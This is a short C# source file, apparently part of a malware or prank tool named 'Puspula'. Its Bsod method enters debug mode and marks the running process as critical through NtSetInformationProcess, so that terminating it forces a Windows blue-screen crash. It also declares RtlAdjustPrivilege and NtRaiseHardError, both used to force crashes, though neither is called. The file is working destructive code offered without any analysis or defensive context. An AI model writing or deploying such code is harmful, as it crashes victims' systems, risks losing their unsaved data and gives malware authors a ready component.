using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Puspula
{
    public class bBsod
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

        private const int BreakOnTermination = 0x1D;
        private static int isCritical = 1;

        private const uint STATUS_ASSERTION_FAILURE = 0xC0000420;

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlAdjustPrivilege(ulong privilege, bool enablePrivilege, bool isThreadPrivilege, out bool previousValue);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);

        public static void Bsod()
        {
            Process.EnterDebugMode();
            IntPtr handle = Process.GetCurrentProcess().Handle;
            NtSetInformationProcess(handle, BreakOnTermination, ref isCritical, sizeof(int));
        }
    }
}
